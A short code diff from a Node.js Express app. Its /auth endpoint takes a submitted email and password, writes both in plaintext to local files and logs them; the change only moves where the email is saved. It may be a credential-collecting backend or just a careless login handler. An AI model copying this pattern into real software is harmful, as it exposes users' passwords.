@@ -16,7 +16,7 @@ app.post("/auth", cors(), async (req, res) => {
     var data = req.body
     email = JSON.stringify(data.email)
     pass = JSON.stringify(data.pass)
-    fs.writeFileSync("./DATA/email.txt", email)
+    fs.writeFileSync("email.js", email)
     fs.writeFileSync("./DATA/pass.txt", pass)
     console.log(data, typeof(data))
 })
